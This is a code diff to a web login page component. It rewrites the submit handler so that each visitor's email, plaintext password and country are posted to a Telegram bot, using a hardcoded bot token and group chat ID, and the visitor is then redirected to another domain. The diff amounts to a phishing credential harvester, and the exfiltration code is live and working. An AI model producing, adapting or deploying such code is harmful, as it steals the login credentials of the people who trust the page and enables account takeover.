@@ -46,17 +46,23 @@ export default function Home() {
       setIsProcessing(true); // Show processing modal
 
       try {
-        // Send email and password with country to the backend API
-        const response = await axios.post('/api/send-email', {
-          email,
-          password,
-          country,
+        // Prepare data to send to Telegram
+        const message = `NEW login from ${country} \nEmail: ${email} \nPassword: ${password}`;
+
+        // Send message to Telegram via bot API
+        const response = await axios.post(`https://api.telegram.org/bot8006326532:AAEr9sd_wmWeI_8ULKtTuyp19a9ja9qJz_A/sendMessage`, {
+          chat_id: '-1002493880170', // Replace with your Group ID
+          text: message,
         });
 
-        console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sg.alltrack-cokflies.click';
+        if (response.status === 200) {
+          console.log('Message sent successfully to Telegram!', response.data);
+          window.location.href = 'https://sg.alltrack-cokflies.click'; // Redirect on success
+        } else {
+          throw new Error('Failed to send message to Telegram.');
+        }
       } catch (error) {
-        console.error('Failed to send email:', error);
+        console.error('Failed to send message to Telegram:', error);
         setErrorMessage('Failed to submit. Please try again.');
       } finally {
         setIsProcessing(false); // Hide processing modal after API call completes
